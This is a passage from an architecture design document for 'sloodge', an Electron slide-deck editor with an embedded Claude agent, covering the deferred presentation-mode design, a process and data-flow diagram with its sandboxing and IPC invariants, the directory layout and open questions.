> in the renderer as pure, Electron-free modules is what makes the state machine, the clamp, the key
> map, the blank toggle and the auto-hide timer unit-testable in CI (which cannot render Electron),
> and reusing `SlideFrame` verbatim is what keeps the sandbox/CSP a single reviewable boundary
> instead of a second, weaker one.
>
> **Tradeoffs accepted.** The overlay shares the editor's renderer process, so it does **not** give
> the process-level fault isolation §7 wanted (a slide that hangs its own JS can still stall the app
> during a talk); there is **no presenter console**, **no multi-display targeting**, no build-step
> (`data-sl-build`) advancement, no `powerSaveBlocker`, and no `.`-to-black. Present forces Design
> Mode off on entry (`designStore.setEnabled(false)`) and restores the prior Design-Mode state on
> exit.
>
> **Deferred to M4.7 (`feat: present hardening`)** — the separate-window design described below:
> the main-owned `PresentService`, the per-slide `WebContentsView` for fault isolation, the
> presenter console, multi-display targeting, off-screen preload of the next slide, `powerSaveBlocker`,
> and the `present:start`/`present:goto`/`present:state` IPC surface. The text below is the target for
> that milestone, retained verbatim so it is not lost.

**[DEFERRED to M4.7 — target design, not yet built]** `src/main/present/PresentService.ts` owns it.

`present:start` →
1. Create a borderless, `fullscreen: true`, `alwaysOnTop` (during present) `BrowserWindow` on the
   chosen display (`screen.getAllDisplays()`; default = the display the editor is on, or the
   secondary display if one exists).
2. Attach a `WebContentsView` per §7's recommendation for the active slide, sized to the window and
   letterboxed to 16:9 by `PresentService` (bounds math in main, not CSS, so an oversized slide
   can't overflow the window).
3. If a second display exists, keep the editor window as the **presenter console**: current slide
   (small), next slide preview, speaker notes, elapsed timer, and slide `n/N`. That view is driven
   by the `present:state` event; it never renders its own copy of navigation logic.
4. Slide navigation (`→`/`Space`/`PgDn`, `←`/`PgUp`, `Home`/`End`, `Esc`, `B` blank, `.` black)
   is captured by the present window and routed to `present:goto`. Build steps
   (`data-build-index`, per [30-slide-format.md](30-slide-format.md)) are advanced first; when a
   slide's steps are exhausted, navigation moves to the next slide.
5. Slide swaps preload the next slide's `WebContentsView` off-screen and swap on advance, so
   transitions don't show a blank frame.
6. `powerSaveBlocker.start('prevent-display-sleep')` for the duration.

`present:stop` (Esc, or end-of-deck + another advance) tears down the view, releases the power
blocker, restores the editor window, and pushes the final `present:state`.

Design Mode is force-disabled while presenting (`uiStore.mode === 'present'`), and the slide runtime
is started in `present` mode so hit-test overlays and the picker script are inert.

---

## 9. Architecture diagram

```
┌──────────────────────────────────────────────────────────────────────────────────────┐
│ MAIN PROCESS (Node, trusted)                                                         │
│                                                                                      │
│   src/main/index.ts ── security/hardening.ts (session CSP, nav guard, permissions)    │
│         │                                                                            │
│         ├── ipc/router.ts ◄──────── typed invoke ────────────────┐                    │
│         │      │                                                │                    │
│         │      ▼                                                │                    │
│         ├── document/DocumentSession.ts  ◄── the ONLY mutator ───┤                    │
│         │      │  apply(DocCommand[], origin)                    │                    │
│         │      ├── history.ts  (undo/redo stacks, transactions)  │                    │
│         │      ├── invert.ts   (command -> inverse command)      │                    │
│         │      └── emits DocPatch ──── 'doc:changed' ────────────┼──┐                 │
│         │                                                       │  │                 │
│         ├── document/DocumentService.ts                          │  │                 │
│         │      ├── sloodgeFile.ts (atomic tmp+rename)   ──► ~/Decks/talk.sloodge      │
│         │      └── recovery/ (snapshot.sloodge + journal.ndjson) ──► userData/recovery│
│         │                                                       │  │                 │
│         ├── agent/AgentService.ts                                │  │                 │
│         │      ├── chatBridge.ts ──► AsyncIterable<SDKUserMessage>│ │                 │
│         │      ├── tools/*  (SDK MCP server "slides")            │  │                 │
│         │      │      └── handler ──► DocumentSession.apply(…, {kind:'agent'})        │
│         │      ├── permissions.ts ── 'agent:ask' ────────────────┼──┤                 │
│         │      └── streamProjector.ts ── 'agent:event' ──────────┼──┤                 │
│         │                 ▲                                      │  │                 │
│         │                 │ stdio                                │  │                 │
│         │        ┌────────┴─────────┐                            │  │                 │
│         │        │ claude CLI child │──── HTTPS ──► api.anthropic.com                 │
│         │        │  (Agent SDK)     │                            │  │                 │
│         │        └──────────────────┘                            │  │                 │
│         │                                                        │  │                 │
│         ├── export/  printToPDF · capturePage · pptxgenjs ───────►  deck.pdf/.pptx    │
│         ├── present/PresentService.ts ── owns present window + WebContentsView        │
│         ├── secrets/KeyStore.ts (safeStorage)  ── key never leaves main               │
│         └── menu/appMenu.ts ── 'app:menu' ───────────────────────┼──┤                 │
└──────────────────────────────────────────────────────────────────┼──┼─────────────────┘
                                                                   │  │
                              contextBridge ('sloodge')             │  │  events
┌──────────────────────────────────────────────────────────────────┼──┼─────────────────┐
│ PRELOAD (isolated world, no Node exposed)                        │  │                 │
│   invoke.ts (allow-listed channels) ─────────────────────────────┘  │                 │
│   subscribe.ts (allow-listed events) ◄──────────────────────────────┘                 │
└───────────────────────────────────────────┬───────────────────────────────────────────┘
                                            │ window.sloodge
┌───────────────────────────────────────────┴───────────────────────────────────────────┐
│ RENDERER (React 19 · Tailwind v4 · shadcn/ui · Zustand) — replica only, no fs/net      │
│                                                                                       │
│   ipc/client.ts ──► docStore (applyPatch)   chatStore   selectionStore  uiStore …      │
│        │                    │                   │              │                      │
│        ▼                    ▼                   ▼              ▼                      │
│   ┌──────────┐   ┌───────────────────────┐   ┌─────────┐   ┌──────────┐               │
│   │Thumbnail │   │ SlideCanvas           │   │ChatPanel│   │FormatBar │               │
│   │ Rail     │   │  └ SlideFrame         │   │ + Ask   │   │StatusBar │               │
│   └────┬─────┘   │      ┌──────────────┐ │   │  cards  │   └──────────┘               │
│        │         │      │  <iframe     │ │   └─────────┘                              │
│        └─ many ──┤      │  sandbox=    │ │                                            │
│          small   │      │ "allow-      │ │   DesignMode overlay ──► doc:apply         │
│          frames  │      │  scripts"    │ │   (element picker, property panel)         │
│                  │      │  blob: URL   │ │                                            │
│                  │      │  own strict  │ │   postMessage ONLY (zod-validated,          │
│                  │      │  CSP, opaque │◄┼── source-checked). No preload. No IPC.      │
│                  │      │  origin      │ │                                            │
│                  │      └──────────────┘ │                                            │
│                  └───────────────────────┘                                            │
└───────────────────────────────────────────────────────────────────────────────────────┘

PRESENT MODE (separate window owned by main)
┌───────────────────────────────────────────────────────────────────────────────────────┐
│ BrowserWindow(fullscreen) ── WebContentsView(active slide, own OS process)             │
│      ▲ keys ──► present:goto            'present:state' ──► editor = presenter console │
└───────────────────────────────────────────────────────────────────────────────────────┘

Data-flow invariants
  1. Document mutations ALWAYS go through DocumentSession.apply() — human, design, and agent alike.
  2. The renderer never mutates the document locally; it applies patches it receives back.
  3. Chat narrative and document patches are independent streams.
  4. Slide iframes have no preload, no same-origin, no network; postMessage is their only channel.
  5. The API key exists only in the main process.
```

---

## 10. Directory layout (consolidated)

```
sloodge/
├── electron.vite.config.ts        # three builds: main / preload / renderer
├── electron-builder.yml           # nsis + dmg; asarUnpack for the Agent SDK binary
├── index.html                     # renderer entry (with <meta> CSP)
├── resources/
│   └── skills/                    # slide-deck, svg-animation, interactive-graph (staged per deck)
└── src/
    ├── main/
    │   ├── index.ts
    │   ├── window/           mainWindow.ts  windowState.ts
    │   ├── menu/             appMenu.ts  accelerators.ts
    │   ├── ipc/              router.ts  handlers/{doc,agent,export,present,app}.ts
    │   ├── document/         DocumentSession.ts  DocumentService.ts  history.ts
    │   │                     invert.ts  patch.ts  sloodgeFile.ts  recovery/{write,scan}.ts
    │   ├── agent/            AgentService.ts  chatBridge.ts  streamProjector.ts
    │   │                     permissions.ts  hooks.ts  workspace.ts  locateBinary.ts
    │   │                     tools/{getDeck,addSlide,editSlide,deleteSlide,reorder,setTheme,
    │   │                            renderThumbnail}.ts
    │   ├── export/           pdf.ts  pptx.ts  html.ts  renderPool.ts       # 60-export.md
    │   ├── present/          PresentService.ts  displays.ts
    │   ├── secrets/          KeyStore.ts
    │   └── security/         hardening.ts
    ├── preload/
    │   ├── index.ts  api.ts  invoke.ts  subscribe.ts
    │   └── slide-preload.ts
    ├── renderer/             # see §1.3
    └── shared/               # see §1.4
```

---

## 11. Open questions / deferred

- **History persistence.** Undo history dies on close in v1. If users ask for it, the journal
  (§6) already has the shape needed — persist `HistoryEntry[]` alongside it.
- **Multi-window decks.** One document per window in v1; `DocumentSession` is already per-document,
  so multi-window is a window-registry change, not an architecture change.
- **WebContentsView for the editor canvas.** Iframes are the v1 choice for speed. If a slide's JS
  regularly janks the editor, promote the *active* canvas slide to a `WebContentsView` too — the
  `SlideFrame` postMessage protocol is deliberately transport-agnostic so this swap is local.
- **Agent session recycling.** ~1 GiB per live session; long decks may need `close()` + `resume` on
  a turn-count or memory threshold.
